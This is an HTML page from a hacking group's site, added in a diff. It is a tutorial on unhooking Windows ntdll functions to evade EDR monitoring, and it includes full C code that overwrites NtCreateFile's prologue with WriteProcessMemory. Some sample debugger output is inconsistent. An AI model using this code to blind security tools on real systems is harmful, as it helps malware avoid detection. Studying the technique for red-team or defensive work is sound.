@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: Unhooking Windows NTAPI to bypass EDRs - Amolo</title>
+
+    <style>
+    @font-face {
+        font-family: 'EnglishTowne';
+        src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+    }
+
+    body {
+        background-image: url('../../../imgs/bg.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        margin: 0;
+        padding: 0;
+    }
+
+    .ascii {
+        color: white;
+        padding: 30px;
+        text-align: center;
+        font-family: 'EnglishTowne', cursive;
+        font-size: 90px;
+    }
+
+    .nav {
+        display: flex;
+        justify-content: center;
+        background-color: rgba(5, 5, 5, 0.8);
+        gap: 10px;
+        padding: 10px 0;
+    }
+
+    .nav a {
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+
+    .nav a:hover {
+        background-color: rgb(38, 7, 112);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .nav a.active {
+        background-color: rgb(71, 37, 153);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .card {
+        color: #000;
+        background-color: #aaa;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .pre-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    pre {
+		background-color: #1e1e1e40;
+		color: white;
+		padding: 20px 30px;
+		border-radius: 10px;
+		box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+		width: 90%;
+		max-width: 1200px;
+		margin: 0 auto;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		font-family: monospace;
+
+		border: 2px solid rgba(255, 255, 255, 0.75);
+		box-sizing: border-box;
+
+		text-indent: 0;
+		word-break: break-word;
+	}
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Members❳─❯</a>
+    </div>
+
+    <div class="ascii">
+        Amolo ☽
+    </div>
+
+    <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">
+        Unhooking Windows NTAPI to bypass EDRs
+    </h1>
+    <p style="line-height: normal; margin:unset; padding:unset; margin-bottom: 20px; font-family:monospace; text-align:center; color:white;">
+		Author: @br0sck
+	</p>
+
+    <div class="pre-container">
+        <pre>
+                  ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⠴⠶⠶⠶⠶⠶⠶⠶⠶⢤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⢀⣤⠶⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀
+                  ⠀⠀⢀⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⡄⠀⠀⠀
+                  ⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀
+                  ⢰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀
+                  ⣿⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡄⠀⢹⡄
+                  ⡏⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⡇
+                  ⣿⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⢸⡇
+                  ⢹⡆⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⣾⠀
+                  ⠈⢷⡀⢸⡇⠀⢀⣠⣤⣶⣶⣶⣤⡀⠀⠀⠀⠀⠀⢀⣠⣶⣶⣶⣶⣤⣄⠀⠀⣿⠀⠀
+                  ⠀⠈⢷⣼⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⠀⠀
+                  ⠀⠀⠈⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠃⠀⢸⡇⠀⠀⠀
+                  ⠀⠀⠀⣿⠀⠀⠘⢿⣿⣿⣿⣿⡿⠃⠀⢠⠀⣄⠀⠀⠙⢿⣿⣿⣿⡿⠏⠀⠀⢘⡇⠀⠀⠀
+                  ⠀⠀⠀⢻⡄⠀⠀⠀⠈⠉⠉⠀⠀⠀⣴⣿⠀⣿⣷⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⢸⡇⠀⠀⠀
+                  ⠀⠀⠀⠈⠻⣄⡀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⠀⠘⣟⠳⣦⡀⠀⠀⠀⠸⣿⡿⠀⢻⣿⡟⠀⠀⠀⠀⣤⡾⢻⡏⠁⠀⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⠀⠀⢻⡄⢻⠻⣆⠀⠀⠀⠈⠀⠀⠀⠈⠀⠀⠀⢀⡾⢻⠁⢸⠁⠀⠀⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⠀⠀⢸⡇⠀⡆⢹⠒⡦⢤⠤⡤⢤⢤⡤⣤⠤⡔⡿⢁⡇⡿⠀⠀⠀⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⠀⠀⠘⡇⠀⢣⢸⠦⣧⣼⣀⡇⢸⢀⣇⣸⣠⡷⢇⢸⠀⡇⠀⠀⠀⠀⠀⠀⠀
+                  ⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠺⣄⣇⢸⠉⡏⢹⠉⡏⢹⢀⣧⠾⠋⢠⡇⠀⠀⠀~ If you want to calm down an EDR, create and offer
+                  ⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠛⠁⠀⠀⠀⠀ your sweetest treat. The sweeter it is, the better
+                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⠶⠦⣤⣤⣤⡤⠶⠞⠋⠁⠀⠀⠀⠀⠀⠀ it will taste and the more effective it will be at calming it.
+
+
+
+
+
+            ▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓▓▓▓    
+          ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓  
+          ▓▓▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒          ▒▒▒▒▒▒▒▒▒▒▓▓  
+          ▓▓▒▒                           Summary                      ▒▒▓▓  
+          ▓▓▒▒                                                        ▒▒▓▓  
+            ▓▓▒▒                    1. Introduction                   ▒▒▓▓▓▓
+            ▓▓▒▒                                                      ▒▒▓▓▓▓
+            ▓▓▒▒                                                      ▒▒▓▓  
+          ▓▓▓▓▒▒                                                      ▒▒▓▓  
+          ▓▓▒▒                     2. What is Hook?                   ▒▒▓▓▓▓
+          ▓▓▒▒                                                          ▒▒▓▓
+          ▓▓▓▓▒▒                                                        ▒▒▓▓
+            ▓▓▒▒                                                        ▒▒▓▓
+            ▓▓▒▒                 3. How does Hook work?               ▒▒▓▓▓▓
+            ▓▓▒▒                                                      ▒▒▓▓  
+            ▓▓▓▓▒▒                                                    ▒▒▓▓  
+            ▓▓▒▒                                                      ▒▒▓▓  
+            ▓▓▓▓▒▒                 4. Detecting Hooks                 ▒▒▓▓▓▓
+            ▓▓▒▒                                                        ▒▒▓▓
+            ▓▓▒▒                                                        ▒▒▓▓
+            ▓▓▒▒                                                        ▒▒▓▓
+            ▓▓▒▒                    5. The Five Bytes                   ▒▒▓▓
+            ▓▓▒▒                                                      ▒▒▓▓▓▓
+            ▓▓▒▒                                                      ▒▒▒▒  
+            ▓▓▒▒                                                      ▒▒▒▒  
+          ▓▓▓▓▒▒                  6. Unhooking an NTAPI               ▒▒▒▒  
+          ▓▓▒▒                                                        ▒▒▓▓  
+          ▓▓▓▓▒▒                                                      ▒▒▓▓▓▓
+            ▓▓▒▒                                                      ▒▒▓▓
+            ▓▓▒▒                7. Final Acknowledgements               ▒▒▓▓
+          ▓▓▓▓▒▒                                                        ▒▒▓▓
+          ▓▓▓▓▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▓▓
+            ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓  
+                ▓▓▓▓▓▓        ▓▓▓▓▓▓    ▓▓▓▓▓▓      ▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓  
+
+        
+╔═══════════════════╗  
+║    Introduction   ║  
+╚═══════════════════╝  
+
+Over the years, companies developing security mechanisms against threats have been modernizing their solutions.  
+Currently, many companies protect their networks with mechanisms such as Antivirus (AV) and Endpoint Detection and Response (EDR).  
+While there is one side that aims to protect itself against threats, there is another side that aims to break this protection, developing numerous techniques to achieve their goals.
+
+One of the techniques used to bypass EDRs is known as "Unhooking Windows NTAPI's".  
+
+╔══════════════════════════╗  
+║      What is a Hook?     ║  
+╚══════════════════════════╝  
+
+In programming, "Hook" refers to the technique of intercepting or replacing the behavior of a function or method through hooks for purposes of modification or monitoring.  
+This is usually done at the operating system level or in applications to alter the normal flow of execution of certain functionalities.  
+
+╔══════════════════════════════════╗  
+║      How does the Hook work?     ║  
+╚══════════════════════════════════╝  
+
+Most EDR systems use hooks to detect malicious actions, with a main focus on the Windows Native APIs, known as NTAPI.  
+The Windows Native API is mainly used in the development of internal components of the operating system, such as device drivers, subsystems, and system services.  
+It is implemented in the ntdll.dll library (NT Layer DLL) and offers low-level functionalities for process management, memory manipulation, file and registry access, service control, inter-process communication, and much more.
+
+Many malicious executables make use of the main native APIs that are extensively monitored by EDR systems:
+
+* NtAllocateVirtualMemory
+* NtCreateThread(Ex)
+* NtOpenProcess
+* NtProtectVirtualMemory
+* NtReadVirtualMemory
+* NtWriteVirtualMemory
+
+
+╔═══════════════════════════════╗  
+║       Detecting Hooks         ║  
+╚═══════════════════════════════╝  
+
+Microsoft's debugging tool known as WinDbg is a great tool to detect if any running program is being hooked.  
+You can download it from the link below:  
+
+https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools  
+
+Run WinDbg and click on "File > Open Executable...".  
+A prompt called "Command" will appear, and through it, you will check the state of a Windows Native API.  
+I will use the NTAPI NtCreateFile as an example for this scenario.  
+
+To view the state of the NTAPI, type "u NtCreateFile".  
+The result should look something like this:
+
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ Microsoft (R) Windows Debugger Version 10.0.22621.755 AMD64                                                 ║
+║ Copyright (c) Microsoft Corporation. All rights reserved.                                                   ║
+║                                                                                                             ║
+║ CommandLine: C:\Users\Brosck\MyProgram.exe                                                                  ║
+║                                                                                                             ║
+║ ************* Path validation summary **************                                                        ║
+║ Response                         Time (ms)     Location                                                     ║
+║ Deferred                                       srv*                                                         ║
+║ Symbol search path is: srv*                                                                                 ║
+║ Executable search path is:                                                                                  ║
+║ ModLoad: 00007ff6`7d230000 00007ff6`7d259000   MyProgram.exe                                                ║
+║ ModLoad: 00007ffe`244d0000 00007ffe`246c8000   ntdll.dll                                                    ║
+║ ModLoad: 00007ffe`23bb0000 00007ffe`23c6f000   C:\Windows\System32\KERNEL32.DLL                             ║
+║ ModLoad: 00007ffe`22180000 00007ffe`22476000   C:\Windows\System32\KERNELBASE.dll                           ║
+║ ModLoad: 00007ffe`1f420000 00007ffe`1f4b1000   C:\Windows\SYSTEM32\apphelp.dll                              ║
+║ ModLoad: 00007ffe`238c0000 00007ffe`2396f000   C:\Windows\System32\ADVAPI32.dll                             ║
+║ ModLoad: 00007ffe`23340000 00007ffe`233de000   C:\Windows\System32\msvcrt.dll                               ║
+║ ModLoad: 00007ffe`22bd0000 00007ffe`22c6c000   C:\Windows\System32\sechost.dll                              ║
+║ ModLoad: 00007ffe`22aa0000 00007ffe`22bc6000   C:\Windows\System32\RPCRT4.dll                               ║
+║ (4698.3d60): Break instruction exception - code 80000003 (first chance)                                     ║
+║ ntdll!LdrpDoDebuggerBreak+0x30:                                                                             ║
+║ 00007ffe`245a0910 cc              int     3                                                                 ║
+║ 0:000> u NtCreateFile                               <-------------------------- Comando enviado             ║
+║ ntdll!NtCreateFile:                                 <-------------------------- Resultado                   ║
+║ 00007ffe`2456daf0 4c8bd1          mov     r10,rcx                                                           ║
+║ 00007ffe`2456daf3 b855000000      mov     eax,55h                                                           ║
+║ 00007ffe`2456daf8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1            ║
+║ 00007ffe`2456db00 7503            jne     ntdll!NtCreateFile+0x15 (00007ffe`2456db05)                       ║
+║ 00007ffe`2456db02 0f05            syscall                                                                   ║
+║ 00007ffe`2456db04 c3              ret                                                                       ║
+║ 00007ffe`2456db05 cd2e            int     2Eh                                                               ║
+║ 00007ffe`2456db07 c3              ret                                                                       ║
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+If there is any hook in NTAPI, the result will be similar to this:
+
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║ Microsoft (R) Windows Debugger Version 10.0.22621.755 AMD64                                                 ║
+║ Copyright (c) Microsoft Corporation. All rights reserved.                                                   ║
+║                                                                                                             ║
+║ CommandLine: C:\Users\Brosck\MyProgram.exe                                                                  ║
+║                                                                                                             ║
+║ ************* Path validation summary **************                                                        ║
+║ Response                         Time (ms)     Location                                                     ║
+║ Deferred                                       srv*                                                         ║
+║ Symbol search path is: srv*                                                                                 ║
+║ Executable search path is:                                                                                  ║
+║ ModLoad: 00007ff6`7d230000 00007ff6`7d259000   MyProgram.exe                                                ║
+║ ModLoad: 00007ffe`244d0000 00007ffe`246c8000   ntdll.dll                                                    ║
+║ ModLoad: 00007ffe`23bb0000 00007ffe`23c6f000   C:\Windows\System32\KERNEL32.DLL                             ║
+║ ModLoad: 00007ffe`22180000 00007ffe`22476000   C:\Windows\System32\KERNELBASE.dll                           ║
+║ ModLoad: 00007ffe`1f420000 00007ffe`1f4b1000   C:\Windows\SYSTEM32\apphelp.dll                              ║
+║ ModLoad: 00007ffe`238c0000 00007ffe`2396f000   C:\Windows\System32\ADVAPI32.dll                             ║
+║ ModLoad: 00007ffe`22aa0000 00007ffe`22bc4000   C:\Windows\System32\EDRAgent.dll   <------ DLL do EDR        ║
+║ ModLoad: 00007ffe`23340000 00007ffe`233de000   C:\Windows\System32\msvcrt.dll                               ║
+║ ModLoad: 00007ffe`22bd0000 00007ffe`22c6c000   C:\Windows\System32\sechost.dll                              ║
+║ ModLoad: 00007ffe`22aa0000 00007ffe`22bc6000   C:\Windows\System32\RPCRT4.dll                               ║
+║ (4698.3d60): Break instruction exception - code 80000003 (first chance)                                     ║
+║ ntdll!LdrpDoDebuggerBreak+0x30:                                                                             ║
+║ 00007ffe`245a0910 cc              int     3                                                                 ║
+║ 0:000> u NtCreateFile                               <-------------------------- Comando enviado             ║
+║ ntdll!NtCreateFile:                                 <-------------------------- Resultado diferente         ║
+║ 00007ffe`2456daf0 4c8bd1          jmp     80000003  <-------------------------- Pulo para um endereço       ║
+║ 00007ffe`2456daf3 b855000000      add     byte ptr [rax],al                                                 ║
+║ 00007ffe`2456daf3 b855000000      add     byte ptr [rdi],cl                                                 ║
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+I developed a simple tool to detect all NTAPIs that are being hooked when running the program. It is useful to know which NTAPIs are being hooked by EDR, because it checks all of them.
+
+Repository:
+
+https://github.com/Brosck/APIHookingDetector
+
+You can download the static compiled version by following the link below:
+
+https://github.com/Brosck/APIHookingDetector/releases
+
+Execution example:
+
+╔═══════════════════════════════════════════════════════════════════════════════════════════╗
+║ PS C:> .\Detector.exe -o output.txt                                                       ║
+║                                                                                           ║
+║                                                                                           ║
+║    _   ___ ___   _  _          _   _             ___      _          _                    ║
+║   /_\ | _ \_ _| | || |___  ___| |_(_)_ _  __ _  |   \ ___| |_ ___ __| |_ ___ _ _          ║
+║  / _ \|  _/| |  | __ / _ \/ _ \ / / | ' \/ _` | | |) / -_)  _/ -_) _|  _/ _ \ '_|         ║
+║ /_/ \_\_| |___| |_||_\___/\___/_\_\_|_||_\__, | |___/\___|\__\___\__|\__\___/_|           ║
+║                                          |___/                                            ║
+║                                                                                           ║
+║                                    [Coded by Brosck]                                      ║
+║                                                                                           ║
+║ [*] NT API being hooked:                                                                  ║
+║ ========================================================================================= ║
+║ [-] NtAllocateVirtualMemory [0xXXXXXXXX != 0xXXXXXXXX]                                    ║
+║ [-] NtOpenProcess [0xXXXXXXXX != 0xXXXXXXXX]                                              ║
+║ [-] NtWriteVirtualMemory [0xXXXXXXXX != 0xXXXXXXXX]                                       ║
+║ ...                                                                                       ║
+╚═══════════════════════════════════════════════════════════════════════════════════════════╝
+
+To remove the hook from the EDR's DLL in the process, it is necessary to overwrite the first 5 bytes through the memory address of the NTAPI.  
+
+╔═════════════════════════╗  
+║     The Five Bytes      ║  
+╚═════════════════════════╝  
+
+The five bytes of an NTAPI are the instructions intended to define the NTAPI's function. They are composed of:  
+
+0x4C 0x8B 0xD1 0xB8 0xXX  
+------------------- ----  
+standard sequence   syscall  
+
+The first four bytes are standard in Windows operating systems. There may be some small variations, but in recent versions they are composed of this byte sequence.  
+
+The last byte is the syscall of a Windows system API, which is responsible for defining what the API actually is.  
+
+Using the CFF Explorer tool from Explorer Suite, it is possible to obtain the first five bytes of an NTAPI through its relative virtual address, known as RVA.  
+
+Tool website: https://ntcore.com/?page_id=345  
+
+Follow these steps:  
+1 - Open CFF Explorer and go to "File > Open" and select the path to NTDLL (C:/Windows/System32/ntdll.dll).  
+
+2 - Click on "Export Directory" and look for the name of the NTAPI you want in "name". In my case, the RVA is 0009DAF0.  
+
+3 - Click on "Address Converter" and in the "RVA" field paste the RVA address of the NTAPI you chose.  
+
+0009DAF0 | 4C 8B D1 B8 55 00 00 00 F6 04 25 08 03 FE 7F 01  
+		   --------------  
+		   the five bytes  
+
+These are the five bytes of the NtCreateFile NTAPI on my version of Windows.  
+
+Save your extracted five bytes somewhere.  
+
+╔════════════════════════════════╗  
+║       Unhooking an NTAPI       ║  
+╚════════════════════════════════╝  
+
+To unhook, it is necessary to write the original five bytes into the process memory at the NTAPI's memory address. For this task, we will use the Windows API known as WriteProcessMemory in a C code.  
+
+The code below is the implementation of WriteProcessMemory to fix the hook and restore the NTAPI's standard routine:  
+
+Definition of NtCreateFile
+╔════════════════════════════════════════════════════════╗
+║  typedef NTSTATUS(WINAPI* SysNtCreateFile)(            ║
+║      PHANDLE FileHandle,                               ║
+║      ACCESS_MASK DesiredAccess,                        ║
+║      POBJECT_ATTRIBUTES ObjectAttributes,              ║
+║      PIO_STATUS_BLOCK IoStatusBlock,                   ║
+║      PLARGE_INTEGER AllocationSize,                    ║
+║      ULONG FileAttributes,                             ║
+║      ULONG ShareAccess,                                ║
+║      ULONG CreateDisposition,                          ║
+║      ULONG CreateOptions,                              ║
+║      PVOID EaBuffer,                                   ║
+║      ULONG EaLength                                    ║
+║  );                                                    ║
+╚════════════════════════════════════════════════════════╝
+
+Byte overwriting
+╔═════════════════════════════════════════════════════════════════════════════════════════╗
+║ HMODULE ntdll = GetModuleHandleA("ntdll");                                              ║
+║ SysNtCreateFile NtCreateFile = (SysNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");  ║
+║                                                                                         ║
+║ HANDLE currentProc = GetCurrentProcess();                                               ║
+║ WriteProcessMemory(currentProc, NtCreateFile, "\x4C\x8B\xD1\xB8\x55", 6, NULL);         ║
+╚═════════════════════════════════════════════════════════════════════════════════════════╝
+
+As long as the program does not pass through the "WriteProcessMemory" function, the NTAPI NtCreateFile will be hooked and monitored by EDR. From the moment the program passes the "WriteProcessMemory" function, the NTAPI will be restored to default and there will be no hook on it, resulting in a Windows API disengagement.
+
+The code below represents the complete code of my program that will disengage the NTAPI NtCreateFile hook:
+
+╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║  #include <.Windows.h>                                                                                     ║
+║  #include <.stdio.h>                                                                                       ║
+║  #include "winternl.h"                                                                                     ║
+║  #pragma comment(lib, "ntdll")                                                                             ║
+║                                                                                                            ║
+║  #define NT_SUCCESS(x) ((x) >= 0)                                                                          ║
+║                                                                                                            ║
+║  typedef NTSTATUS(WINAPI* SysNtCreateFile)(                                                                ║
+║    PHANDLE FileHandle,                                                                                     ║
+║    ACCESS_MASK DesiredAccess,                                                                              ║
+║    POBJECT_ATTRIBUTES ObjectAttributes,                                                                    ║
+║    PIO_STATUS_BLOCK IoStatusBlock,                                                                         ║
+║    PLARGE_INTEGER AllocationSize,                                                                          ║
+║    ULONG FileAttributes,                                                                                   ║
+║    ULONG ShareAccess,                                                                                      ║
+║    ULONG CreateDisposition,                                                                                ║
+║    ULONG CreateOptions,                                                                                    ║
+║    PVOID EaBuffer,                                                                                         ║
+║    ULONG EaLength                                                                                          ║
+║  );                                                                                                        ║
+║                                                                                                            ║
+║    //====================================[EDR is monitoring]==================================             ║
+║  int main()                                                                                                ║
+║  {                                                                                                         ║
+║    HMODULE ntdll = GetModuleHandleA("ntdll");                                                              ║
+║    SysNtCreateFile NtCreateFile = (SysNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");                  ║
+║    if (NtCreateFile == NULL) {                                                                             ║
+║      puts("[-] Unable to get address of NtCreateFile function");                                           ║
+║      return 1;                                                                                             ║
+║    }                                                                                                       ║
+║                                                                                                            ║
+║    HANDLE currentProc = GetCurrentProcess();                                                               ║
+║    //================================[EDR is monitoring so far]===============================             ║
+║                                                                                                            ║
+║    WriteProcessMemory(currentProc, NtCreateFile, "\x4C\x8B\xD1\xB8\x55", 6, NULL); // NTAPI unhooked       ║
+║                                                                                                            ║
+║                                                                                                            ║
+║    //==============================[EDR is no longer monitoring]==============================             ║
+║    HANDLE fileHandle;                                                                                      ║
+║    OBJECT_ATTRIBUTES objectAttributes;                                                                     ║
+║    IO_STATUS_BLOCK ioStatusBlock;                                                                          ║
+║    UNICODE_STRING fileName;                                                                                ║
+║                                                                                                            ║
+║    RtlInitUnicodeString(&fileName, L"\\??\\C:\\Users\\Public\\openme.txt");                                ║
+║    InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);             ║
+║                                                                                                            ║
+║    NTSTATUS status;                                                                                        ║
+║    if (!NT_SUCCESS(status = NtCreateFile(                                                                  ║
+║      &fileHandle,                                                                                          ║
+║      FILE_GENERIC_WRITE,                                                                                   ║
+║      &objectAttributes,                                                                                    ║
+║      &ioStatusBlock,                                                                                       ║
+║      0,                                                                                                    ║
+║      FILE_ATTRIBUTE_NORMAL,                                                                                ║
+║      FILE_SHARE_WRITE,                                                                                     ║
+║      FILE_OVERWRITE_IF,                                                                                    ║
+║      FILE_SYNCHRONOUS_IO_NONALERT,                                                                         ║
+║      NULL,                                                                                                 ║
+║      0))) {                                                                                                ║
+║      puts("[-] Could not create file");                                                                    ║
+║    }                                                                                                       ║
+║    else {                                                                                                  ║
+║      puts("[+] File created");                                                                             ║
+║    }                                                                                                       ║
+║      return 0;                                                                                             ║
+║  }                                                                                                         ║
+╚════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+* https://github.com/AmoloHT/PapersArchives/tree/main/unhooking-winapi-to-bypass-edrs
+
+In your code, try changing the last byte to any other and run your program.  
+
+Example: "\x4C\x8B\xD1\xB8\x55" -> "\x4C\x8B\xD1\xB8\x01"  
+
+Your program will not be able to proceed because you changed it to a syscall different from the one you actually set.  
+
+My example with the correct last byte:  
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  
+║ [+] File created                                                                                                    ║  
+║                                                                                                                     ║  
+║ C:\Users\Brosck\source\repos\Unhooking\x64\Release\Unhooking.exe (process 1536) has exited with code 0.             ║  
+║ Press any key to close this window...                                                                               ║  
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  
+
+My example with the incorrect last byte:  
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  
+║ [-] Could not create the file                                                                                       ║  
+║                                                                                                                     ║  
+║ C:\Users\Brosck\source\repos\Unhooking\x64\Release\Unhooking.exe (process 1536) has exited with code 0.             ║  
+║ Press any key to close this window...                                                                               ║  
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  
+
+A simple implementation of the WriteProcessMemory API can be enough to change the routine of a program that is being hooked.  
+
+╔═════════════════════════════╗  
+║    Final Acknowledgements   ║  
+╚═════════════════════════════╝  
+
+Thank you very much to everyone who made it this far; this is a topic that is currently being widely addressed within hacking, and it is valuable to have this privileged knowledge about evasion.  
+This subject has become a requirement for those working with red teams, who always need to face an EDR during internal pentests.  
+
+I also want to thank all the members of Amolo for being part of this team. This was our first anniversary, and it is very gratifying to be with the whole team during this year.  
+
+Thanks also to everyone who follows all our content posted here and on social media.  
+
+It’s a pleasure to be with all of you <3.
+
+                            _--_
+                            /   -)
+                        ___/___|___
+           ____-----=~~///|     ||||~~~==-----_____
+         //~////////////~/|     |//|||||\\\\\\\\\\\\\
+       ////////////////////|   |///////|\\\\\\\\\\\\\\\
+      /////~~~~~~~~~~~~~~~\ |.||/~~~~~~~~~~~~~~~~~`\\\\\
+     //~                  /\\|\\                      ~\\
+                         ///W^\W\
+                        ////|||\\\
+                        ~~~~~~~~~~     
+
+                  Happy Birthday Amolo!!
+                </pre>                    
+        </div>
+    </body>
+</html>
